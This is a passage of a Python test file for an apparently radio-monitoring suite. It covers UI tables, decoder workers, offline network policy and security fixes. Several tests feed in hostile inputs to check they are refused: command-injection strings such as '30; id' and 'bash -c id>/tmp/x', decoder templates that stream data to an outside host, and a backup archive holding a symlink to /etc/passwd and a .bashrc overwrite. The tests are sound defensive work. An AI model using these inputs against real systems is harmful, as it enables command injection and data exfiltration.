    assert {"fm", "aprs", "ais", "wifi"} <= keys          # receive tools stay


# ================================================================== v0.1 line — SWEEP hidden
def test_v01_sweep_is_hidden_from_strip_keys_palette_and_by_name(net, monkeypatch):
    monkeypatch.delenv("PALISADE_SHOW_HIDDEN", raising=False)
    from palisade_qt.shell import PalisadeHub
    hub = PalisadeHub(demo=False, mode="dark")
    try:
        assert "SWEEP" not in hub.topbar.nav_keys
        assert not any("SWEEP" in label for label, _fn in hub._commands())
        hub.open_callsign("SWEEP")
        assert "SWEEP" not in hub.pages
        from PySide6 import QtCore, QtGui
        for digit in "1234567890":
            ev = QtGui.QKeyEvent(QtCore.QEvent.KeyPress, 0, QtCore.Qt.NoModifier, digit)
            hub.eventFilter(hub, ev)
        assert "SWEEP" not in hub.pages
        assert len(hub.topbar.nav_keys) == 7
    finally:
        hub.close()


# ================================================================== B4 — tables keep their place
def test_b4_refresh_keeps_selection_and_scroll_on_the_same_item():
    from palisade_qt.kit import FeedTable
    ft = FeedTable([("id", "ID"), ("v", "V")])
    ft.resize(400, 200)
    ft.show()
    rows = [{"_id": i, "id": "c%d" % i, "v": i} for i in range(100)]
    ft.model.set_rows(rows)
    _app().processEvents()
    ft.view.selectRow(40)
    ft.view.scrollTo(ft.model.index(35, 0), QtWidgets.QAbstractItemView.PositionAtTop)
    _app().processEvents()
    top_before = ft.view.rowAt(0)
    sel = []
    ft.selected.connect(sel.append)
    ft.model.set_rows([{"_id": -1, "id": "new", "v": 0}] + rows)       # a new row arrives on top
    _app().processEvents()
    assert ft.model.rows[ft.view.currentIndex().row()]["_id"] == 40
    assert ft.model.rows[ft.view.rowAt(0)]["_id"] == rows[top_before]["_id"]
    # arrow keys move the detail (row-changed signal, not mouse-only)
    ft.view.setFocus()
    ft.move_cursor(1)
    _app().processEvents()
    assert sel and sel[-1]["_id"] == 41
    ft.close()


# ================================================================== B5 — OPS scope selection
def test_b5_ops_scope_selects_and_labels_a_contact_and_has_no_sweep():
    from palisade_qt.kit import ppi
    src = open(ppi.__file__).read()
    assert "_spin" not in src and "QTimer" not in src
    scope = ppi.PpiScope(mode="dark")
    got = []
    scope.contact_clicked.connect(got.append)
    scope.set_contacts([{"id": "A1", "x": 10, "y": 10, "label": "UAL1"},
                        {"id": "B2", "x": -20, "y": 5, "label": "DAL2"}], selected="B2")
    assert [t.textItem.toPlainText() for t in scope._labels] == ["DAL2"]
    pts = scope.scatter.points()
    scope._clicked(scope.scatter, [p for p in pts if p.data() == "A1"])
    assert got == ["A1"]


def test_b5_ops_page_select_contact_toggles(net):
    from palisade_qt import ops, eventbus
    eventbus.set_home((47.6, -122.3), "test")
    page = ops.OpsHome(demo=False, mode="dark")
    try:
        page._contacts = {"A1": {"id": "A1", "x": 1, "y": 1, "label": "UAL1", "_ts": time.time()}}
        page.select_contact("A1")
        assert page._selected == "A1"
        assert [t.textItem.toPlainText() for t in page.ppi._labels] == ["UAL1"]
        page.select_contact("A1")
        assert page._selected is None
        page.select_contact("ghost")
        assert page._selected is None
    finally:
        page.stop()
        eventbus.set_home(None)


# ================================================================== B6 — TPMS hop, map labels
def test_b6_tpms_hops_and_settings_are_checked():
    import argsafe
    from palisade_qt import babel
    argv = babel.tpms_argv({"freqs": ["315M", "433.92M"], "gain": 0})
    assert argv[argv.index("-H") + 1] == str(babel.TPMS_HOP_S) and babel.TPMS_HOP_S <= 60
    assert "-H" not in babel.tpms_argv({"freqs": ["315M"]})
    for bad in ({"freqs": [POC]}, {"freqs": ["315M", "433M"], "hop_s": 0},
                {"freqs": ["315M", "433M"], "hop_s": "30; id"}, {"freqs": ["315M"], "gain": "x"}):
        with pytest.raises(argsafe.SettingsRefused):
            babel.tpms_argv(bad)


def test_b6_map_labels_do_not_overlap():
    from palisade_qt.kit import MapPanel
    m = MapPanel(span_nm=40)
    m.resize(600, 600)
    m.show()
    _app().processEvents()
    pts = [(0.1 * i, 0.05 * i) for i in range(12)]              # a tight cluster
    m.set_contacts(pts, labels=["CONTACT%02d" % i for i in range(12)])
    _app().processEvents()
    assert 1 <= len(m._contact_labels) < 12 and m.labels_skipped == 12 - len(m._contact_labels)
    m.set_contacts([(-30, -30), (30, 30)], labels=["A", "B"])   # far apart: both labelled
    assert len(m._contact_labels) == 2
    m.close()


# ================================================================== E6 — pass already in progress
def test_e6_a_pass_in_progress_is_kept(monkeypatch, tmp_path):
    pytest.importorskip("skyfield")
    from skyfield.api import EarthSatellite, load, wgs84
    import wxsat
    ts = load.timescale()
    l1 = "1 25544U 98067A   24001.50000000  .00016717  00000-0  10270-3 0  9002"
    l2 = "2 25544  51.6416 247.4627 0006703 130.5360 325.0288 15.72125391    04"
    sat = EarthSatellite(l1, l2, "ISS", ts)
    home = {"lat": 39.7, "lon": -104.9}
    obs = wgs84.latlon(home["lat"], home["lon"])
    t0 = ts.utc(2024, 1, 1, 12)
    times, evs = sat.find_events(obs, t0, ts.tt_jd(t0.tt + 2), altitude_degrees=10.0)
    aos = next(t for t, e in zip(times, evs) if e == 0)
    los = next(t for t, e in zip(times, evs) if e == 2 and t.tt > aos.tt)
    mid = ts.tt_jd((aos.tt + los.tt) / 2)

    class TS:
        def now(self):
            return mid

        def __getattr__(self, k):
            return getattr(ts, k)
    monkeypatch.setattr(wxsat, "load_sats", lambda s, path=None: (
        TS(), [({"name": "ISS", "freq": 145.8}, sat)]))
    passes = wxsat.predict({}, home, hours=2, path=str(tmp_path))
    assert passes and passes[0]["in_progress"] is True
    assert abs(passes[0]["aos"] - aos.utc_datetime().timestamp()) < 2
    assert all(p["los"] > mid.utc_datetime().timestamp() for p in passes)


def test_l3_offline_sitrep_and_tiles_never_call_urlopen(net, monkeypatch, tmp_path):
    """The network-failure tests now run ONLINE; OFFLINE must not reach urllib at all."""
    import urllib.request
    import sitrep
    calls = []
    def fake(req, *a, **k):
        calls.append(getattr(req, "full_url", req))
        raise OSError("no local feed")
    monkeypatch.setattr(urllib.request, "urlopen", fake)
    monkeypatch.setattr(sitrep.core, "AIRPORTS", {k: {"name": k} for k in ("KAPA", "KDEN")})
    # Pin the ADS-B feed to the loopback HTTP source. The defaults try /run/readsb first, and on a
    # uConsole with readsb running that file feed answers, so urllib is never reached and the
    # loopback assertion had nothing to check (device check 2026-11-17: calls == []).
    monkeypatch.setattr(sitrep.core, "load_settings",
                        lambda: {"adsb_sources": [str(tmp_path / "no-feed"), "http://127.0.0.1:8080/data"]})
    assert net.mode() == "OFFLINE"
    d = sitrep.gather()
    assert d["metar"] is None and sitrep._tfr(["CO"]) is None
    assert calls and all(u.startswith("http://127.0.0.1") for u in calls), calls   # loopback only


def test_l3_offline_with_a_local_readsb_file_feed_reaches_no_url(net, monkeypatch, tmp_path):
    """The device case: readsb writes aircraft.json locally, so OFFLINE sitrep makes no URL call at
    all (metar/TFR refused before urllib) and still reads the aircraft."""
    import json
    import urllib.request
    import sitrep
    calls = []
    monkeypatch.setattr(urllib.request, "urlopen",
                        lambda req, *a, **k: calls.append(getattr(req, "full_url", req)))
    monkeypatch.setattr(sitrep.core, "AIRPORTS", {k: {"name": k} for k in ("KAPA", "KDEN")})
    feed = tmp_path / "readsb"
    feed.mkdir()
    (feed / "aircraft.json").write_text(json.dumps({"aircraft": [{"hex": "abc123", "seen": 1}]}))
    monkeypatch.setattr(sitrep.core, "load_settings",
                        lambda: {"adsb_sources": [str(feed), "http://127.0.0.1:8080/data"]})
    assert net.mode() == "OFFLINE"
    d = sitrep.gather()
    assert d["metar"] is None and sitrep._tfr(["CO"]) is None
    assert calls == []


# ================================================================== CL8-fix (RA-CL8 findings)
def test_ra_scout_wifi_cmd_from_settings_never_reaches_another_program(monkeypatch, tmp_path):
    """RA-CL8 blocker 1: scout.json's wifi_cmd was split and run as-is (`bash -c id>…`)."""
    import subprocess
    import scout
    ran = []
    monkeypatch.setattr(subprocess, "run", lambda argv, **k: ran.append(argv))
    for bad in ("bash -c id>/tmp/x", "nmcli connection delete home", "nmcli dev wifi connect x",
                "nmcli -f a dev wifi list; id", "nmcli --ask dev wifi list", "/usr/bin/nmcli dev wifi list",
                "nmcli dev wifi list ifname ../../x", 5, None):
        aps, err = scout.wifi_scan(bad)
        assert aps is None and "SETTINGS REFUSED" in err, (bad, err)
    assert ran == []
    assert scout.wifi_argv(scout.DEFAULTS["wifi_cmd"]) == \
        ["nmcli", "-t", "-f", "SSID,SIGNAL,CHAN,SECURITY,BSSID", "dev", "wifi", "list"]
    assert scout.wifi_argv("nmcli -t dev wifi list ifname wlan0 --rescan yes")[-1] == "yes"


@pytest.mark.parametrize("src,tmpl", [
    ("sensors", "rtl_433 -F syslog:203.0.113.5:514"),
    ("sensors", "rtl_433 -F mqtt:203.0.113.5:1883,events=x"),
    ("sensors", "rtl_433 -F json:out.json"),
    ("sensors", "rtl_433 -F influx:http:x"),
    ("sensors", "rtl_433 -w capture.cu8"),
    ("sensors", "rtl_433 -W capture.cu8"),
    ("sensors", "rtl_433 -c evil.conf"),
    ("sensors", "rtl_433 -S all"),
    ("sensors", "rtl_433 -r file.cu8"),
    ("sensors", "rtl_433 -d rtl_tcp:203.0.113.5:1234"),
    ("sensors", "rtl_433 -d rtl_tcp"),
    ("sensors", "rtl_433 -d soapy"),
    ("sensors", "rtl_433 -d driver=remote,remote=203.0.113.5"),
    ("sensors", "rtl_433 {gain[0]}"),
    ("acars", "acarsdec --output json:udp:address=203.0.113.5,port=5555 {freqs}"),
    ("acars", "acarsdec --output json:file:path=capture.json {freqs}"),
    ("acars", "acarsdec -j 203.0.113.5:5555 {freqs}"),
    ("acars", "acarsdec -n 203.0.113.5:5555 {freqs}"),
    ("acars", "acarsdec -l log.txt {freqs}"),
    ("acars", "acarsdec --rtlsdr rtl_tcp:x {freqs}"),
    ("vdl2", "dumpvdl2 --output decoded:json:udp:address=203.0.113.5,port=5555 136650000"),
    ("vdl2", "dumpvdl2 --output decoded:json:zmq:mode=server,endpoint=tcp://*:5555 136650000"),
    ("vdl2", "dumpvdl2 --iq-file x.cu8 136650000"),
    ("vdl2", "dumpvdl2 136650000 evil"),
])
def test_ra_decoder_templates_cannot_send_data_off_device_or_write_files(src, tmpl):
    """RA-CL8 blocker 2: a template could stream decoded data to another host past netpolicy."""
    import argsafe
    import signals
    key = {"acars": "acars_cmd", "vdl2": "vdl2_cmd"}.get(src, "rtl433_cmd")
    with pytest.raises(argsafe.SettingsRefused):
        signals.build_argv({"source": src, key: tmpl, "acars_freqs": [131.55]})


def test_ra_shipped_and_old_default_templates_still_build():
    import signals
    for src in ("acars", "vdl2", "sensors"):
        argv = signals.build_argv(dict(signals.DEFAULTS, source=src))
        assert argv[0] in ("acarsdec", "dumpvdl2", "rtl_433")
    old = signals.build_argv(dict(signals.DEFAULTS, source="acars",
                                  acars_cmd=signals.OLD_DEFAULTS["acars_cmd"][0]))
    assert old[:3] == ["acarsdec", "-o", "1"] and "131.550" in old


@pytest.mark.parametrize("name,settings,mode", [
    ("signals", {"source": "acars", "acars_cmd": "acarsdec {gain[0]} {freqs}"}, "ACARS"),
    ("signals", {"source": "acars", "acars_freqs": 5}, "ACARS"),
    ("tpms", {"freqs": 5}, "TPMS"),
])
def test_ra_malformed_setting_type_refuses_and_releases_the_radio(monkeypatch, fakebin, name,
                                                                   settings, mode):
    """RA-CL8 NEW-1: a TypeError fell into the 'no capture (offline)' branch: radio held, retry
    every second, no FAULT."""
    home, marker = fakebin
    binz = home / "fakebin"
    for b in ("acarsdec", "rtl_433", "dumpvdl2"):
        p = binz / b
        p.write_text("#!/bin/sh\necho %s >> '%s'\nsleep 30\n" % (b, marker))
        p.chmod(0o755)
    cfg = home / ".config" / "uconsole-suite"
    cfg.mkdir(parents=True)
    (cfg / ("%s.json" % name)).write_text(json.dumps(settings))
    from palisade_qt import babel, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    statuses = []
    w = babel.DecoderWorker(demo=False, mode=mode)
    w.status.connect(statuses.append)
    w.set_running(True)
    w.start()
    try:
        assert _until(lambda: lease.released, 4000), "radio held: %r" % statuses[-3:]
        time.sleep(1.5)
        _app().processEvents()
        assert len(lease.made) == 1, "retried: %r" % lease.made
        assert any("SETTINGS REFUSED" in (st.get("sdr") or {}).get("text", "") for st in statuses)
        assert not any("offline" in (st.get("sdr") or {}).get("text", "") for st in statuses)
        assert not marker.exists() and ra.arbiter.owner() is None
    finally:
        w.stop()
        assert w.wait(4000)


def test_ra_unexpected_start_error_is_a_fault_and_releases_the_radio(monkeypatch, fakebin):
    home, marker = fakebin
    from palisade_qt import babel, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)

    def boom(worker):
        raise RuntimeError("unexpected")
    monkeypatch.setitem(babel._LIVE_RUNNERS, "POCSAG", boom)
    faults, statuses = [], []
    w = babel.DecoderWorker(demo=False, mode="POCSAG")
    w.fault.connect(faults.append)
    w.status.connect(statuses.append)
    w.set_running(True)
    w.start()
    try:
        assert _until(lambda: lease.released, 4000)
        time.sleep(1.2)
        _app().processEvents()
        assert len(lease.made) == 1
        assert any("FAILED TO START" in (st.get("sdr") or {}).get("text", "") for st in statuses)
        assert any("RuntimeError" in f for f in faults)
    finally:
        w.stop()
        assert w.wait(4000)


def _harden_failing(tmp_path, fail_on):
    """harden.sh with sudo stubbed: the ufw call matching `fail_on` exits 1, the rest record."""
    import subprocess
    stub = tmp_path / "stub"
    stub.mkdir(exist_ok=True)
    rec = tmp_path / "ran.txt"
    (stub / "sudo").write_text('#!/bin/sh\necho "sudo $*" >> "%s"\ncase "$*" in *"%s"*) exit 1;; esac\n'
                               % (rec, fail_on))
    (stub / "ufw").write_text("#!/bin/sh\nexit 0\n")
    for p in stub.iterdir():
        p.chmod(0o755)
    env = dict(os.environ, PATH=str(stub) + os.pathsep + os.environ["PATH"])
    r = subprocess.run(["bash", os.path.join(SUITE_DIR, "harden.sh"), "--field", "--yes"], env=env,
                       capture_output=True, text=True, timeout=20, stdin=subprocess.DEVNULL)
    return r, rec.read_text().splitlines()


@pytest.mark.parametrize("fail_on", ["default deny incoming", "default allow outgoing"])
def test_ra_harden_field_never_leaves_the_firewall_off_when_a_step_fails(tmp_path, fail_on):
    """RA-CL8 blocker 4: `ufw --force reset` turns ufw off; a later failure under set -e used to
    exit before `enable`."""
    r, ran = _harden_failing(tmp_path, fail_on)
    assert r.returncode != 0                       # the failure is still reported
    reset = ran.index("sudo ufw --force reset")
    assert "sudo ufw --force enable" in ran[reset:], ran
    assert "turning the firewall back on" in r.stderr


def test_ra_offline_loopback_through_a_remote_proxy_is_blocked(net, monkeypatch):
    for k in ("no_proxy", "NO_PROXY"):
        monkeypatch.delenv(k, raising=False)
    monkeypatch.setenv("http_proxy", "http://203.0.113.9:3128")
    with pytest.raises(net.NetBlocked):
        net.check("http://127.0.0.1:11434/api/chat")
    monkeypatch.setenv("http_proxy", "http://127.0.0.1:3128")        # a local proxy is fine
    assert net.check("http://127.0.0.1:11434/api/chat") == "127.0.0.1"
    monkeypatch.setenv("http_proxy", "http://203.0.113.9:3128")
    net.set_mode("ONLINE", persist=False)
    assert net.check("http://127.0.0.1:11434/api/chat") == "127.0.0.1"


def test_ra_session_log_open_shows_the_unseen_fault_and_a_repeat_relights(net, slog):
    from palisade_qt.panels import SessionLogPanel
    lg = slog.log()
    lg.record("fault", "BABEL", "decoder exited after 0.2s")
    for i in range(40):
        lg.record("info", "NET", "request %d allowed" % i)
    p = SessionLogPanel(mode="dark")
    p.resize(1000, 400)
    p.open()
    _app().processEvents()
    v = p.table.view
    row = v.currentIndex().row()
    assert p.table.model.rows[row]["level"] == "FAULT" or "0.2s" in p.table.model.rows[row]["text"]
    assert v.visualRect(v.currentIndex()).intersects(v.viewport().rect()), "fault not on screen"
    assert lg.faults_unseen() == 0
    p.close()
    _app().processEvents()
    lg.record("fault", "BABEL", "decoder exited after 0.2s")       # the same fault again
    assert lg.faults_unseen() == 1


def test_ra_prepended_rows_keep_a_scrolled_view_in_place():
    from palisade_qt.kit import FeedTable
    ft = FeedTable([("id", "ID"), ("v", "V")])
    ft.resize(400, 200)
    ft.show()
    ft.model.set_rows([{"_id": i, "id": "r%d" % i, "v": i} for i in range(200)])
    _app().processEvents()
    ft.view.scrollTo(ft.model.index(100, 0), QtWidgets.QAbstractItemView.PositionAtTop)
    _app().processEvents()
    top = ft.model.rows[ft.view.rowAt(0)]["_id"]
    for k in range(5):
        ft.model.prepend({"_id": -k - 1, "id": "n%d" % k, "v": 0})
        _app().processEvents()
    assert ft.model.rows[ft.view.rowAt(0)]["_id"] == top
    ft.view.scrollToTop()                                           # following the live feed
    _app().processEvents()
    ft.model.prepend({"_id": -99, "id": "n99", "v": 0})
    _app().processEvents()
    assert ft.view.rowAt(0) == 0
    ft.close()


def test_ra_tk_home_grid_offers_no_retired_or_hidden_tool():
    import hub
    src = open(hub.__file__).read()
    assert "GROUPS = visible_groups(GROUPS)" in src
    keys = re.findall(r'\("launch", "([a-z0-9]+)"\)', src)
    groups = [("g", None, [(k, k, k, ("launch", k)) for k in keys])]
    left = {t[0] for g in hub.visible_groups(groups) for t in g[2]}
    for k in ("cw", "rtty", "digi", "replay", "pm3", "wifix", "blex", "zb", "zw", "hid",
              "sweep", "jam", "imsi", "gnss"):
        assert k in keys and k not in left, k
    assert {"fm", "sky", "wifi"} <= left


def test_ra_doctor_says_unavailable_when_libcrypt_cannot_hash_the_scheme(tmp_path, monkeypatch):
    import doctor
    shadow = tmp_path / "shadow"
    shadow.write_text("dragon:$gy$j9T$salt$hash:19000:0:99999:7:::\n")
    monkeypatch.setenv("USER", "dragon")
    ok, msg, _ = doctor.chk_default_password(str(shadow), crypt_fn=lambda w, s: None)
    assert ok is None and "unavailable" in msg


def test_ra_keymap_says_seven_pages_and_sky_menu_uses_the_root_launcher():
    from palisade_qt import panels
    assert panels.KEYMAP[0][0] == "1 – 7"
    tail = open(os.path.join(SUITE_DIR, "install_tail.sh")).read()
    assert "Exec=/usr/local/bin/sky" in tail and "Exec=$HOME/.local/bin/sky" not in tail



# ================================================================== CL8-fix2 (RA-CL8b findings)
def _live_decoder(monkeypatch, fakebin, mode, binary, settings=None, name=None):
    """Run BABEL `mode` live against a fake `binary` that records its argv and prints nothing."""
    home, marker = fakebin
    p = home / "fakebin" / binary
    p.write_text('#!/bin/sh\necho "%s $*" >> "%s"\nsleep 30\n' % (binary, marker))
    p.chmod(0o755)
    if settings is not None:
        cfg = home / ".config" / "uconsole-suite"
        cfg.mkdir(parents=True, exist_ok=True)
        (cfg / ("%s.json" % name)).write_text(json.dumps(settings))
    from palisade_qt import babel, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    statuses = []
    w = babel.DecoderWorker(demo=False, mode=mode)
    w.status.connect(statuses.append)
    w.set_running(True)
    w.start()
    return w, lease, statuses, marker


@pytest.mark.parametrize("settings", [None, {"source": "sensors"}, {"source": "acars"}])
def test_ra8b_babel_acars_starts_acarsdec_never_the_sensor_decoder(monkeypatch, fakebin, settings):
    """RA-CL8b NEW-A/NEW-E: ACARS handed _open_pipe a flat argv (one stage per string), so it
    never started and held the radio; with the default source it would have run rtl_433."""
    from palisade_qt import radio_arbiter as ra
    w, lease, statuses, marker = _live_decoder(monkeypatch, fakebin, "ACARS", "acarsdec",
                                               settings, "signals")
    try:
        assert _until(lambda: marker.exists(), 4000), statuses[-3:]
        assert _until(lambda: any((st.get("sdr") or {}).get("text") == "ACARS LIVE"
                                  for st in statuses), 2000)
        ran = marker.read_text()
        assert ran.startswith("acarsdec --output json:file:path=- --rtlsdr 0"), ran
        assert "131.550" in ran and "rtl_433" not in ran
        assert ra.arbiter.owner() == "BABEL"
    finally:
        w.stop()
        assert w.wait(5000)
    assert lease.released and ra.arbiter.owner() is None


def test_ra8b_babel_tpms_runs_rtl_433_with_the_hop(monkeypatch, fakebin):
    w, lease, statuses, marker = _live_decoder(monkeypatch, fakebin, "TPMS", "rtl_433")
    try:
        assert _until(lambda: marker.exists(), 4000), statuses[-3:]
        ran = marker.read_text()
        assert "-f 315M -f 433.92M -H 30" in ran, ran
        assert _until(lambda: any((st.get("sdr") or {}).get("text") == "TPMS LIVE"
                                  for st in statuses), 2000)
    finally:
        w.stop()
        assert w.wait(5000)
    assert lease.released


def test_ra8b_restore_writes_only_suite_settings(tmp_path, monkeypatch):
    """RA-CL8b NEW-C: a restored archive could drop .bashrc, suite code or rtl_433.conf in HOME."""
    import tarfile
    import suite as S
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(S, "HOME", str(home))
    src = tmp_path / "src"
    src.mkdir()
    f = src / "f"
    f.write_text("x")
    arc = str(tmp_path / "b.tar.gz")
    good = [".config/uconsole-suite/fm.json", ".config/sky-app/settings.json",
            ".local/share/uconsole-suite/sky_records.json", ".local/share/uconsole-suite/logbook/a.jsonl",
            ".cache/uconsole-suite/bingo.json"]
    bad = [".bashrc", ".profile", "uconsole-suite/hub.py", ".config/rtl_433/rtl_433.conf",
           ".local/share/uconsole-suite/other.py", ".config/autostart/x.desktop",
           ".config/uconsole-suite-evil/x.json"]
    with tarfile.open(arc, "w:gz") as tf:
        for n in good + bad:
            tf.add(str(f), arcname=n)
        ln = tarfile.TarInfo(".config/uconsole-suite/link.json")
        ln.type, ln.linkname = tarfile.SYMTYPE, "/etc/passwd"
        tf.addfile(ln)
    names = S.restore_configs(arc)
    for n in good:
        assert (home / n).exists(), n
    for n in bad + [".config/uconsole-suite/link.json"]:
        assert not os.path.lexists(home / n), n
    assert sorted(names) == sorted(good)


def test_ra8b_session_log_marks_only_rows_on_screen(net, slog):
    from palisade_qt.panels import SessionLogPanel
    lg = slog.log()
    lg.record("fault", "BABEL", "older fault")
    for i in range(60):
        lg.record("info", "NET", "request %d allowed" % i)
    lg.record("fault", "PRISM", "newer fault")
    assert lg.faults_unseen() == 2
    p = SessionLogPanel(mode="dark")
    p.resize(1000, 400)
    p.open()
    _app().processEvents()
    assert lg.faults_unseen() == 1, "the off-screen fault was marked seen"
    p.table.view.scrollToTop()
    _app().processEvents()
    assert lg.faults_unseen() == 0
    p.close()


def test_ra8b_prowl_scan_refuses_malformed_scanner_settings(monkeypatch, fakebin):
    home, marker = fakebin
    from palisade_qt import prowl, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    cfg = home / ".config" / "uconsole-suite"
    cfg.mkdir(parents=True)
    for bad in ({"gain": "x"}, {"gain": [1]}, {"custom": 5}, {"squelch": "loud"},
                {"custom": [5]}):
        (cfg / "scanner.json").write_text(json.dumps(bad))
        w = prowl.ScanWorker(demo=False)
        statuses = []
        w.status.connect(statuses.append)
        w._run_live()
        _app().processEvents()
        assert any("SETTINGS REFUSED" in (st.get("sdr") or {}).get("text", "") for st in statuses), bad
        assert not marker.exists() and ra.arbiter.owner() is None


def test_ra8b_harden_says_so_when_the_firewall_cannot_be_turned_back_on(tmp_path):
    r, ran = _harden_failing(tmp_path, "ufw")          # every ufw step fails
    assert r.returncode != 0
    assert "COULD NOT turn the firewall back on" in r.stderr


# ================================================================== CL8-fix3 (RA-CL8c findings)
def _fake(home, name, body):
    p = home / "fakebin" / name
    p.write_text("#!/bin/sh\n" + body + "\n")
    p.chmod(0o755)


def _fm_steps(w, seconds):
    t = time.time()
    while time.time() - t < seconds:
        w.step()
        _app().processEvents()
        time.sleep(0.1)


@pytest.mark.parametrize("dead", ["rtl_fm", "redsea"])
def test_ra8c_prowl_fm_decoder_that_exits_at_once_is_a_fault_not_a_live_loop(monkeypatch, fakebin, dead):
    """RA-CL8c NEW-G: FM respawned every 500 ms on a held radio while showing ♪ live."""
    home, marker = fakebin
    _fake(home, "aplay", "cat >/dev/null")
    _fake(home, "redsea", "cat >/dev/null")
    _fake(home, "rtl_fm", 'echo rtl_fm >> "%s"; sleep 30' % marker)
    _fake(home, dead, 'echo %s >> "%s"; exit 1' % (dead, marker))
    from palisade_qt import prowl, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    w = prowl.FmWorker(demo=False, rds=True)
    faults, statuses = [], []
    w.fault.connect(faults.append)
    w.status.connect(statuses.append)
    w.set_active(True)
    try:
        _fm_steps(w, 4.0)
        assert any("exits at once" in f for f in faults), (faults, statuses[-3:])
        assert ra.arbiter.owner() is None and lease.released
        spawns = marker.read_text().count(dead)
        _fm_steps(w, 1.5)
        assert marker.read_text().count(dead) == spawns, "respawned after the fault"
        assert spawns <= 4, spawns
        assert not any("♪" in (st.get("sdr") or {}).get("text", "") for st in statuses), statuses
        assert not any(st.get("live") for st in statuses)
    finally:
        w._stop = True
        w._kill()


def test_ra8c_prowl_fm_missing_audio_sink_releases_the_radio(monkeypatch, fakebin):
    """RA-CL8c NEW-I: no aplay/pacat raised out of _spawn with the radio held."""
    home, marker = fakebin
    _fake(home, "rtl_fm", "sleep 30")
    import fm
    monkeypatch.setattr(fm, "Pipe", lambda *a, **k: (_ for _ in ()).throw(FileNotFoundError("aplay")))
    from palisade_qt import prowl, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    w = prowl.FmWorker(demo=False, rds=False)
    faults = []
    w.fault.connect(faults.append)
    w.set_active(True)
    try:
        _fm_steps(w, 1.0)
        assert any("cannot start" in f for f in faults), faults
        assert ra.arbiter.owner() is None and len(lease.made) == 1
    finally:
        w._stop = True
        w._kill()


def test_ra8c_prowl_scan_rtl_fm_exiting_at_once_is_a_fault_not_a_quiet_band(monkeypatch, fakebin):
    """RA-CL8c NEW-H: every channel 'quiet' while rtl_fm died at once, radio held."""
    home, marker = fakebin
    _fake(home, "rtl_fm", 'echo rtl_fm >> "%s"; exit 1' % marker)
    from palisade_qt import prowl, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    w = prowl.ScanWorker(demo=False)
    faults = []
    w.fault.connect(faults.append)
    w.set_active(True)
    w.start()
    try:
        assert _until(lambda: any("exits at once" in f for f in faults), 9000), faults
        assert _until(lambda: ra.arbiter.owner() is None, 2000)
        n = marker.read_text().count("rtl_fm")
        time.sleep(1.5)
        assert marker.read_text().count("rtl_fm") == n and n <= 4, n
    finally:
        w.stop()
        assert w.wait(5000)


def test_ra8c_restore_keeps_this_devices_network_mode_and_remote_token(tmp_path, monkeypatch):
    import tarfile
    import suite as S
    home = tmp_path / "home"
    (home / ".config" / "uconsole-suite").mkdir(parents=True)
    (home / ".config" / "uconsole-suite" / "net.json").write_text('{"mode": "OFFLINE"}')
    monkeypatch.setattr(S, "HOME", str(home))
    f = tmp_path / "f"
    f.write_text('{"mode": "ONLINE", "token": "attacker-known-token-123456"}')
    arc = str(tmp_path / "b.tar.gz")
    with tarfile.open(arc, "w:gz") as tf:
        for n in (".config/uconsole-suite/net.json", ".config/uconsole-suite/headless.json",
                  ".config/uconsole-suite/fm.json", ".local/share/uconsole-suite/logbook"):
            tf.add(str(f), arcname=n)                  # logbook: a FILE where a folder goes
        tf.add(str(f), arcname=".local/share/uconsole-suite/sky_records.json")
    names = S.restore_configs(arc)                      # never raises half-way
    assert json.load(open(home / ".config/uconsole-suite/net.json")) == {"mode": "OFFLINE"}
    assert not (home / ".config/uconsole-suite/headless.json").exists()
    assert ".config/uconsole-suite/fm.json" in names
    assert ".local/share/uconsole-suite/sky_records.json" in names


def test_ra8c_open_pipe_refuses_a_flat_argv():
    from palisade_qt import babel
    monkey_off = babel._seam_offscreen
    try:
        babel._seam_offscreen = lambda: False
        with pytest.raises(TypeError):
            babel._open_pipe(["rtl_433", "-F", "json"])
    finally:
        babel._seam_offscreen = monkey_off


def test_ra8c_scan_checks_dwell_hold_and_max_active(fakebin):
    from palisade_qt import prowl
    import argsafe
    w = prowl.ScanWorker(demo=False)
    import scanner
    for k in ("dwell", "hold", "max_active"):
        with pytest.raises(argsafe.SettingsRefused):
            w._check_scanner_settings(dict(scanner.DEFAULTS, **{k: "x"}))
    w._check_scanner_settings(dict(scanner.DEFAULTS))


# ================================================================== CL8-fix4 (RA-CL8d findings)
@pytest.mark.parametrize("bank,after", [("Airband", 1.2), ("Airband", 2.5), ("NOAA Wx", 0.8)])
def test_ra8d_prowl_scan_rtl_fm_dying_after_tuning_is_a_fault_too(monkeypatch, fakebin, bank, after):
    """RA-CL8d NEW-M: only an exit < 1 s counted; rtl_fm dying later looped on a held radio.
    (On a hardware-squelch bank the scanner itself stops rtl_fm at tune + dwell = 1.0 s, so a
    death after that is indistinguishable from a quiet channel; before it, it is caught.)"""
    home, marker = fakebin
    _fake(home, "rtl_fm", 'echo rtl_fm >> "%s"; sleep %s; exit 1' % (marker, after))
    from palisade_qt import prowl, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    w = prowl.ScanWorker(demo=False, bank=bank)
    faults = []
    w.fault.connect(faults.append)
    w.set_active(True)
    w.start()
    try:
        assert _until(lambda: any("exits at once" in f for f in faults), 15000), faults
        assert _until(lambda: ra.arbiter.owner() is None, 3000)
        n = marker.read_text().count("rtl_fm")
        time.sleep(1.5)
        assert marker.read_text().count("rtl_fm") == n and n <= 4, n
    finally:
        w.stop()
        assert w.wait(6000)


@pytest.mark.parametrize("kind,dead", [("aprs", "rtl_fm"), ("aprs", "multimon-ng"),
                                       ("ais", "rtl_ais")])
def test_ra8d_atlas_layer_with_a_dead_decoder_gives_the_radio_back(monkeypatch, fakebin, kind, dead):
    """RA-CL8d NEW-N: a dead APRS/AIS decoder kept the radio (readsb paused) and showed nothing."""
    home, marker = fakebin
    for b in ("rtl_fm", "multimon-ng", "rtl_ais"):
